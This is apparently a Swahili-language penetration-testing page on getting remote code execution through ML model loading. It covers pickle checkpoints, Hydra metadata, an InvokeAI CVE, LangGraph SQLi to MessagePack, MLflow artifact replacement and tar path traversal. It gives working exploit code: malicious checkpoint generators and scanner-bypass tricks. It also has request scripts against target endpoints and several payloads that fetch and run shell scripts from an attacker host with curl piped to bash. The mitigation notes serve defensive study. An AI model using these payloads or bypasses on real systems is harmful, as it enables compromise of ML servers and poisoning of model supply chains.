# RCE ya Miundo

{{#include ../banners/hacktricks-training.md}}

## Kupakia miundo ili kupata RCE

Miundo ya Machine Learning kwa kawaida hushirikiwa katika miundo tofauti, kama vile ONNX, TensorFlow, PyTorch, n.k. Miundo hii inaweza kupakiwa kwenye mashine za wasanidi au mifumo ya uzalishaji ili itumike. Kwa kawaida miundo haipaswi kuwa na msimbo hasidi, lakini katika baadhi ya hali modeli inaweza kutumika kutekeleza msimbo wowote kwenye mfumo, kama kipengele kilichokusudiwa au kutokana na uwezekano wa kuathiriwa katika maktaba ya kupakia modeli.

Jedwali lifuatalo linaorodhesha udhaifu unaowakilisha kategoria hii:

| **Mfumo / Zana**        | **Udhaifu (CVE ikiwa ipo)**                                                    | **Njia ya RCE**                                                                                                                           | **Marejeo**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Uondoaji wa mfululizo usio salama katika* `torch.load` **(CVE-2025-32434)**                                                              | Pickle hasidi katika checkpoint ya modeli husababisha utekelezaji wa msimbo (hukwepa kinga ya `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + upakuaji wa modeli hasidi husababisha utekelezaji wa msimbo; RCE kupitia uondoaji wa mfululizo wa Java katika API ya usimamizi                                        | |
| **NVIDIA Merlin Transformers4Rec** | Uondoaji wa mfululizo wa checkpoint usio salama kupitia `torch.load` **(CVE-2025-23298)**                                           | Checkpoint isiyoaminika huwasha pickle reducer wakati wa `load_model_trainer_states_from_checkpoint` → utekelezaji wa msimbo katika worker ya ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + ndoano isiyo salama ya kiendelezi cha MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kitufe cha `filter` kinachodhibitiwa na mtumiaji huingiza sintaksia ya SQL/JSON-path, `UNION SELECT` hutengeneza rekodi ghushi ya checkpoint, kisha uondoaji wa mfululizo wa `msgpack` huingiza na kuita msimbo wa Python uliochaguliwa na mshambuliaji | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML isiyo salama) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Kupakia modeli kutoka YAML hutumia `yaml.unsafe_load` (utekelezaji wa msimbo) <br> Kupakia modeli yenye tabaka la **Lambda** huendesha msimbo wowote wa Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (uchanganuzi wa TFLite)                                                                                          | Modelo ya `.tflite` iliyoundwa kwa makusudi husababisha integer overflow → uharibifu wa heap (uwezekano wa RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia modeli kupitia `joblib.load` huendesha pickle yenye payload ya `__reduce__` ya mshambuliaji                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` isiyo salama) *inabishaniwa*                                                                              | Chaguo-msingi la `numpy.load` liliruhusu arrays za vitu vilivyopickliwa – `.npy/.npz` hasidi husababisha utekelezaji wa msimbo                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Njia ya external-weights ya modeli ya ONNX inaweza kutoka nje ya directory (kusoma faili zozote) <br> Tar hasidi ya modeli ya ONNX inaweza kubatilisha faili zozote (na kusababisha RCE) | |
| ONNX Runtime (hatari ya usanifu)  | *(Hakuna CVE)* ONNX custom ops / control flow                                                                                    | Modelo yenye operator maalum huhitaji kupakia msimbo asilia wa mshambuliaji; grafu changamano za modeli hutumia vibaya mantiki ili kutekeleza hesabu zisizokusudiwa   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia API ya kupakia modeli huku `--model-control` ikiwa imewashwa huruhusu path traversal ya njia za relative ili kuandika faili (kwa mfano, kubatilisha `.bashrc` na kupata RCE)    | |
| **GGML (muundo wa GGUF)**      | **CVE-2024-25664 … 25668** (heap overflow nyingi)                                                                         | Faili ya modeli ya GGUF iliyoharibika husababisha heap buffer overflow katika parser, na kuwezesha utekelezaji wa msimbo wowote kwenye mfumo wa mwathiriwa                     | |
| **Keras (miundo ya zamani)**   | *(Hakuna CVE mpya)* Modelo ya Keras H5 ya zamani                                                                                         | Msimbo wa modeli hasidi ya HDF5 (`.h5`) yenye tabaka la Lambda bado hutekelezwa inapopakiwa (`safe_mode` ya Keras haijumuishi muundo wa zamani – “downgrade attack”) | |
| **Nyinginezo** (kwa ujumla)        | *Kasoro ya usanifu* – Ubadilishaji wa mfululizo wa Pickle                                                                                         | Zana nyingi za ML (kwa mfano, miundo ya modeli inayotegemea pickle, `pickle.load` ya Python) zitatekeleza msimbo wowote uliopachikwa kwenye faili za modeli isipokuwa hatua za kupunguza hatari zitumike | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadata isiyoaminika inayopitishwa kwa `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/usanidi wa modeli inayodhibitiwa na mshambuliaji huweka `_target_` kuwa callable yoyote (kwa mfano, `builtins.exec`) → hutekelezwa wakati wa kupakia, hata kwa miundo “salama” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna baadhi ya modeli za Python zinazotegemea pickle, kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security), ambazo zinaweza kutumika kutekeleza msimbo wowote kwenye mfumo ikiwa hazitapakiwa kwa `weights_only=True`. Kwa hiyo, modeli yoyote inayotegemea pickle inaweza kuathiriwa hasa na mashambulizi ya aina hii, hata kama haijaorodheshwa kwenye jedwali hapo juu.

### Kukwepa ukaguzi tuli wa checkpoint zinazotegemea pickle

Njia ya kupakia modeli inayotumia `pickle.load()`, `joblib.load()`, au `torch.load(..., weights_only=False)` bila vizuizi ni sehemu ya utekelezaji wa msimbo, si parser tu.<sup>[[22]](#references)</sup> Katika PyTorch 2.6, `torch.load()` hutumia `weights_only=True` kama chaguo-msingi wakati hakuna pickle module maalum iliyotolewa; mifano iliyo hapa chini inahitaji loader isiyo na vizuizi au programu inayozima kinga hii ili kupakia kitu kisichoauniwa.<sup>[[4]](#references)</sup> Matokeo safi ya uchanganuzi tuli hayabadili mpaka huo.<sup>[[21]](#references)</sup>

Angalia [Python pickle deserialization](../pentesting-web/deserialization/#pickle) kwa primitive ya msingi ya `__reduce__` na [Fickling's ML import allowlist](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) kwa ukaguzi wa uingizaji wakati wa utekelezaji.

#### Kusajili callable, kisha kuitatua kwa `EXT2`

Pickle inaweza kuita `copyreg.add_extension` kupitia `REDUCE`, na kusajili jozi ya module/jina chini ya nambari ya kiendelezi iliyochaguliwa na mshambuliaji. Baadaye, `EXT2` hutumia nambari hiyo kutatua callable, ambayo `REDUCE` nyingine inaweza kuiita. Kwa hiyo, callable muhimu si operand ya opcode ya `GLOBAL` au `STACK_GLOBAL`. Binarly ilionyesha hili kwa `multiprocessing.util.spawnv_passfds`; scanners nne kati ya tano zilizotathminiwa hazikuligundua, huku SaferPickle ikiliona. Mabadiliko ya registry na utatuzi wa `EXT2` hutokea ndani ya operesheni hiyo hiyo ya unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Huu ni mchoro wa opcode, si checkpoint kamili: loader ya nje lazima ikubali mkondo wa pickle unaouzunguka. Scanner inayotafuta tu callable hatari katika operands za `GLOBAL` itakosa lookup inayofuata; scanner isiyoauni `EXT2` inaweza kushindwa kabla ya kutoa uamuzi. Allowlist kali bado inaweza kukataa `copyreg.add_extension` yenyewe.<sup>[[21]](#references)</sup>

#### Ficha aina za code-object zilizoundwa ndani ya functions za kawaida

Mnyororo mwingine wa pickle unaweza kupata `FunctionType` kutoka kwa `type(copy.copy)` na `CodeType` kutoka kwa `type(copy.copy.__code__)`, kisha kuunda code object kutoka kwa bytecode iliyotolewa, kuifunga kama function, na kuiita. Lahaja iliyochapishwa hupata `__code__` kupitia `operator.methodcaller('__getattribute__', '__code__')`, kwa hivyo pickle haihitaji kuagiza constructor yoyote kati ya hizo kwa jina. Mpangilio wa sehemu za `CodeType(...)` na bytecode hutegemea toleo la CPython; payload iliyoundwa kwa interpreter tofauti inaweza kushindwa kabla ya kutekelezwa. SaferPickle bado ilibainisha sample iliyoonyeshwa, lakini ikapunguza ukadiriaji wake hadi `suspicious`; scanners nyingine nne zilizotathminiwa hazikuigundua.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Chochea upakiaji wa pili wa modeli kutoka kwa argument ya pickle

Pickle ya nje inaweza kuita `torch.storage._load_from_bytes` ikiwa na modeli iliyoserialishwa na mshambuliaji kama argument yake. Function hiyo huita `torch.load(io.BytesIO(b), weights_only=False)`, kwa hiyo modeli iliyopachikwa deserialishwa bila kizuizi cha weights-only, ingawa kwa kichanganuzi cha opcode cha kiwango cha juu inaonekana kama bytes zilizopitishwa kwa callable moja. Upakiaji wa nje bado lazima uruhusu callable hiyo; `weights_only=True` haifanyi pickle ya nje ikubali callable hiyo moja kwa moja. Vichanganuzi ambavyo havichunguzi upya bytes zilizopachikwa vinaweza kukosa mnyororo wa ndani wa `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Tatua jina la moduli ya zamani ya pickle wakati wa kupakia

Kwa pickle protocols zilizo chini ya 3, `fix_imports=True` ya Python kwa chaguomsingi hubadilisha marejeo ya `GLOBAL` kutoka `commands.run` kwenda `subprocess.run` kupitia `_compat_pickle.IMPORT_MAPPING`. Kwa hiyo, kichanganuzi kinacholinganishwa mfuatano halisi wa moduli na denylist ya `subprocess` kinaweza kukosa callable itakayotumika wakati wa utekelezaji. Hili linahitaji loader inayohifadhi ulinganifu huo na kukubali arguments zitakazotokana nao.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Pitisha checkpoint isiyo ya ZIP pembeni mwa kichanganuzi cha ZIP pekee

Uteuzi wa fomati unaweza kushindwa bila kujali ukaguzi wa opcode: Binarly iligundua kuwa ModelScan 0.8.8 ilielekeza faili za `.bin`, `.pt`, `.pth`, na `.ckpt` kwa kichanganuzi maalum cha ZIP cha PyTorch na kuruka mkondo wa pickle usio wa ZIP badala ya kutumia kichanganuzi chake cha pickle ya kawaida. Pia iliripoti mpangilio wa zamani wa modeli ya TAR ambao `torch.load()` hukubali, lakini ModelScan na JFrog hawakukagua. Haya ni mapungufu mahususi kwa matoleo ya vichanganuzi, si sifa ya kila kichanganuzi cha modeli.<sup>[[21]](#references)</sup>

#### Tekeleza kabla kichanganuzi tuli hakijafikia mwisho ulioharibika

Kichanganuzi kinachopitia pickle nzima kwa `pickletools.genops()` kinaweza kuibua hitilafu kinapokutana na opcode iliyokatika baada ya `REDUCE` halali. Unpickler isiyo na vizuizi tayari imeita callable kabla haijakutana na mwisho huo, hata kama upakiaji mzima baadaye utaibua hitilafu. Sampuli iliyoripotiwa iliweka `BINUNICODE` iliyokatika mara tu baada ya `REDUCE` iliyokuwa ikitekeleza, na kusababisha `pickletools.genops()` kushindwa ingawa athari ya awali ya kuandika faili ilikuwa tayari imetokea. Hii hupita kichanganuzi tu ikiwa kinachukulia hitilafu ya uchanganuzi kama faili salama au kinaruka faili hiyo. Inafaa tu pale athari hiyo ina umuhimu bila modeli kurejeshwa kwa mafanikio; lengwa linalohitaji upakiaji ukamilike linaweza kukataa artifact hiyo.<sup>[[21]](#references)</sup>

### Metadata ya Hydra → RCE (hufanya kazi hata kwa safetensors)

`hydra.utils.instantiate()` huingiza na kuita `_target_` yoyote ya nukta katika object ya usanidi/metadata. Maktaba kama Hugging Face Transformers zinapopitisha **metadata ya modeli isiyoaminika** kwa `instantiate()`, mshambuliaji anaweza kutoa callable na arguments zitakazoanza kutekelezwa mara moja wakati wa kupakia modeli (hakuna pickle inayohitajika).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Mfano wa payload (hufanya kazi katika `model_config.yaml` ya `.nemo`, `config.json` ya repo, au `__metadata__` ndani ya `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Mambo muhimu:
- Hutekelezwa kabla ya uanzishaji wa modeli katika NeMo `restore_from/from_pretrained`, coders za uni2TS HuggingFace, na loaders za FlexTok.
- String block-list ya Hydra inaweza kukwepwa kupitia njia mbadala za import (k.m., `enum.bltns.eval`) au majina yanayotatuliwa na programu (k.m., `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok pia huchanganua metadata iliyogeuzwa kuwa string kwa kutumia `ast.literal_eval`, na hivyo kuwezesha DoS (matumizi makubwa ya CPU/kumbukumbu) kabla ya mwito wa Hydra.

### 🆕  RCE katika InvokeAI kupitia `torch.load` (CVE-2024-12029)

`InvokeAI` ni kiolesura maarufu cha wavuti cha open-source kwa Stable-Diffusion. Matoleo **5.3.1 – 5.4.2** yana REST endpoint `/api/v2/models/install` inayowaruhusu watumiaji kupakua na kupakia modeli kutoka URL zozote.<sup>[[1]](#references)</sup>

Kwa ndani, endpoint hatimaye huita:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wakati faili iliyotolewa ni **checkpoint ya PyTorch (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa kuwa maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kupachika object hasidi yenye method maalum ya `__reduce__` ndani ya checkpoint; method hiyo hutekelezwa **wakati wa deserialization**, na kusababisha **remote code execution (RCE)** kwenye server ya InvokeAI.

Udhaifu huu ulipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa Unyonyaji

1. Unda checkpoint hasidi:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Weka `payload.ckpt` kwenye seva ya HTTP unayoidhibiti (kwa mfano, `http://ATTACKER/payload.ckpt`).
3. Anzisha endpoint iliyo hatarini (hakuna uthibitishaji unaohitajika):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI inapopakua faili, huita `torch.load()` → gadget ya `os.system` hutekelezwa na mshambulizi hupata uwezo wa kutekeleza msimbo katika muktadha wa mchakato wa InvokeAI.

Exploit iliyo tayari kutumika: moduli ya **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` huendesha mtiririko mzima kiotomatiki.<sup>[[3]](#references)</sup>

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (chaguomsingi ya alama ya scan ni **false**)
•  `/api/v2/models/install` inaweza kufikiwa na mshambulizi
•  Mchakato una ruhusa ya kutekeleza amri za shell

#### Hatua za kupunguza hatari

* Pata toleo jipya la **InvokeAI ≥ 5.4.3** – kiraka huweka `scan=True` kama chaguomsingi na huchanganua malware kabla ya deserialization.<sup>[[2]](#references)</sup>
* Unapopakia checkpoints kupitia programu, tumia `torch.load(file, weights_only=True)` au helper mpya ya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Tekeleza allow-lists / saini za vyanzo vya model na endesha huduma kwa ruhusa za kiwango cha chini.

> ⚠️ Kumbuka kwamba **format yoyote** inayotumia Python pickle (ikiwemo faili nyingi za `.pt`, `.pkl`, `.ckpt`, `.pth`) si salama kiasili ku-deserialize kutoka vyanzo visivyoaminika.

---

Mfano wa hatua ya kupunguza hatari ya muda, ikiwa ni lazima uendelee kutumia matoleo ya zamani ya InvokeAI nyuma ya reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia `torch.load` isiyosalama (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilikuwa na loader isiyosalama ya checkpoint iliyoiita `torch.load()` moja kwa moja kwenye paths zilizotolewa na mtumiaji. Kwa kuwa `torch.load` hutegemea Python `pickle`, checkpoint inayodhibitiwa na mshambulizi inaweza kutekeleza code yoyote kupitia reducer wakati wa deserialization.<sup>[[5]](#references)</sup>

Njia iliyo hatarini (kabla ya marekebisho): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hii husababisha RCE: Katika Python pickle, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) inayorejesha callable na arguments. Callable hiyo hutekelezwa wakati wa unpickling. Ikiwa object kama hiyo ipo kwenye checkpoint, hutekelezwa kabla ya uzani wowote kutumiwa.

Mfano mdogo wa checkpoint hasidi:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Njia za usambazaji na ukubwa wa athari:
- Checkpoint/model zilizowekewa Trojan na kushirikiwa kupitia repos, buckets au artifact registries
- Pipelines za automated resume/deploy zinazopakia checkpoint kiotomatiki
- Utekelezaji hufanyika ndani ya workers za training/inference, mara nyingi zikiwa na privileges zilizoinuliwa (kwa mfano, root ndani ya containers)

Suluhisho: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha `torch.load()` ya moja kwa moja na deserializer yenye vikwazo na allow-list, iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya hukagua types/fields na kuzuia callables zisizoaminika kuitwa wakati wa kupakia.<sup>[[7]](#references)</sup>

Mwongozo wa kujilinda mahususi kwa checkpoint za PyTorch:
- Usifanye unpickle data isiyoaminika. Pendelea formats zisizoweza kutekeleza code kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX inapowezekana.
- Ikiwa ni lazima utumie serialization ya PyTorch, hakikisha `weights_only=True` (inayotumika kwenye matoleo mapya ya PyTorch) au tumia unpickler maalum yenye allow-list, sawa na patch ya Transformers4Rec.<sup>[[4]](#references)</sup>
- Thibitisha chanzo/signatures za model na uweke deserialization kwenye sandbox (seccomp/AppArmor; mtumiaji asiye root; FS yenye vizuizi na bila ufikiaji wa mtandao).
- Fuatilia michakato tegemezi isiyotarajiwa kutoka kwa huduma za ML wakati checkpoint inapopakiwa; fuatilia matumizi ya `torch.load()`/`pickle`.

POC na marejeleo ya vulnerable/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnerable ya kabla ya patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC ya checkpoint hasidi: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader ya baada ya patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Mfano – kutengeneza model hasidi ya PyTorch

- Unda model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Pakia modeli:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD ya Tencent ina endpoint ya `resnet` inayofanya deserialization ya data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kuwa mshambuliaji wa mbali anaweza kumshawishi mwathiriwa afungue ukurasa/faili hasidi, na kufanya ukurasa/faili hiyo itume blob ya serialized iliyotengenezwa kwa endpoint hiyo, na kusababisha deserialization itekelezwe kama `root`, hali inayopelekea mfumo kuathiriwa kikamilifu.

Mtiririko wa exploit unafanana na matumizi mabaya ya pickle ya kawaida:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Gadget yoyote inayoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, callbacks za framework, n.k.) inaweza kutumiwa kama silaha kwa njia hiyo hiyo, bila kujali kama njia ya kusafirisha data ilikuwa HTTP, WebSocket, au faili iliyowekwa kwenye directory inayofuatiliwa.



### LangGraph checkpointer SQLi → MessagePack RCE

Mlolongo huu wa shambulio unavutia kwa sababu mshambuliaji **hahitajiki kupakia faili hasidi ya modeli**. Badala yake, programu hufichua **API ya kuhifadhi hali ya AI agent** (`get_state_history(..., filter=...)`), na ingizo la mtumiaji hufika kwenye query builder ya checkpointer.

#### 1. Structural SQLi katika metadata filters

Muundo hatarishi wa SQLite ulionekana hivi:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Thamani huunganishwa baadaye, lakini `query_key` inaunganishwa ndani ya **JSON path string**, kwa hiyo `'` ndani ya dictionary key hutoka kwenye `'$.{query_key}'` na kuingiza SQL. Somo hilohilo linatumika kwa **JSON paths, identifiers, operators, `LIMIT`, na TTL fields**: placeholders hulinda values pekee, si sintaksia ya query.

#### 2. `UNION SELECT` inaweza kulenga sinks zinazotumika baadaye, si kuiba data pekee

Query hurejesha `type` na bytes za `checkpoint` zilizosanifishwa, ambazo hutumiwa baadaye kama:

```python
self.serde.loads_typed((type, checkpoint))
```

Hiyo inamaanisha kuwa SQLi katika kifungu cha `WHERE` inaweza kuingiza **safu bandia ya matokeo**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ikiwa msimbo unaofuata utachanganua, kufanya deserialization, kuandika, au kutekeleza safu wima yoyote iliyochaguliwa, unganisha safu hizo wima na sink zake. Katika hali hii, safu ghushi inabadilisha SQLi kuwa **deserialization inayodhibitiwa na mshambuliaji**.

#### 3. Unsafe MessagePack extension hooks ni sawa na code gadgets

Njia ya `msgpack` ya LangGraph ilitumia extension hook maalum iliyofungua tuple iliyowekwa ndani na kutekeleza:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Kwa hiyo, MessagePack extension object inayosimba kitu sawa na `("os", "system", "id > /tmp/pwned")` hu-import `os`, hutafuta `system`, na kutekeleza amri. Unapokagua AI frameworks, kagua **custom MessagePack/JSON/pickle revivers** ili kubaini dynamic imports, reflection, au arbitrary callable dispatch.

#### 4. Muundo wa ukaguzi wa vitendo kwa agent frameworks

Kagua ingizo lolote linalodhibitiwa na mtumiaji linalofikia:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders zinazozalisha vipande vya SQL au Redis query
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths zinazoamini rows zilizorejeshwa na persistence layer

Chain hii mahususi iliathiri deployments za LangGraph zinazojiendesha zenyewe na kutumia **SQLite** au **Redis** checkpointers pale watumiaji wasioaminika walipoweza kudhibiti `filter`. Matoleo yaliyorekebishwa yaliyoainishwa kwenye disclosure yalikuwa `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, na `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc: kubadilisha artifact ili kusababisha pickle RCE

MLflow PyFunc iliyoundwa kutoka kwa `PythonModel` inaweza kuhifadhi object iliyoserialishwa kama `python_model.pkl`. Metadata ya model hutaja `mlflow.pyfunc.model` kama loader yake, na implementation ya MLflow hutumia jina hili la faili kwa model ya Python iliyohifadhiwa. Kwa hiyo, ruhusa ya kuandika kwenye artifact store inaweza kusababisha code execution katika application nyingine ambayo baadaye hupakia model hiyo.<sup>[[17]](#references)[[18]](#references)</sup>

Chain inayofaa ni **ruhusa ya kuandika artifact → badilisha pickle → fanya inference consumer ipakie upya**. Kwa experiment inayotumia root ya proxied `mlflow-artifacts:/...`, orodhesha experiment, run na njia ya artifact ya model. Tracking server hutoa `GET` na `PUT` kwenye `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Reducer ndogo inaweza kutekeleza command mara tu consumer anapofanya unpickle ya artifact. Kutengeneza payload kwa kutumia toleo la Python lililotajwa kwenye `MLmodel` huepusha matatizo ya uoanifu.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Anzisha operesheni inayopakia **modeli iliyopo**, kama vile prediction, scoring au deployment. Usifanye retraining kwanza, kwa sababu training inaweza kubadilisha artifact hasidi na kuweka modeli mpya. Hitilafu ya programu haimaanishi kuwa shambulio halikufaulu: reducer hurudisha integer exit status ya command badala ya modeli inayoweza kutumika. Anza na side effect inayoweza kuonekana, kama ICMP au HTTP callback, kisha ibadilishe na payload ya mwisho.<sup>[[20]](#references)</sup>

Wakati wa assessment, tofautisha ruhusa ya kuunda run na ruhusa ya kubadilisha artifacts za run nyingine. Kagua authentication na ruhusa za kusasisha za kila run, chunguza mabadiliko yasiyotarajiwa ya `python_model.pkl`, na uchukulie asili na uadilifu wa modeli kuwa sehemu ya mpaka wa utekelezaji. Msimbo wa sasa wa MLflow pia unaunga mkono kuweka `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` na unapendekeza kutumia artifacts za models-from-code badala ya kupakia data ya cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Seva za modeli zilizo wazi na miundombinu ya ML

Kupakia modeli hasidi si njia pekee ya kutekeleza msimbo kwenye miundombinu ya ML. APIs za kuwasilisha job, endpoints za kuthibitisha msimbo na pulls za model registry za huduma za AI zinazojipangia zenyewe zinaweza kusababisha utekelezaji wa msimbo bila kutumia faili yoyote ya modeli. Angalia [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Modeli na Path Traversal

Kama ilivyoelezwa kwenye [**chapisho hili la blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), fomati nyingi za modeli zinazotumiwa na mifumo tofauti ya AI hutegemea archives, kwa kawaida `.zip`. Kwa hiyo, huenda ikawezekana kutumia vibaya fomati hizi kufanya mashambulizi ya Path Traversal, na hivyo kusoma faili zozote kwenye mfumo ambako modeli inapakiwa.<sup>[[16]](#references)</sup>

Kwa mfano, kwa kutumia msimbo ufuatao unaweza kuunda modeli ambayo itatengeneza faili kwenye saraka ya `/tmp` inapopakiwa:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Au, kwa kutumia code ifuatayo unaweza kuunda model itakayounda symlink kwenye directory ya `/tmp` inapopakiwa:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Uchunguzi wa kina: Keras .keras deserialization na gadget hunting

Kwa mwongozo maalumu kuhusu mambo ya ndani ya .keras, RCE kupitia Lambda-layer, suala la arbitrary import katika ≤ 3.8, na ugunduzi wa gadget baada ya marekebisho ndani ya allowlist, tazama:


{{#ref}}
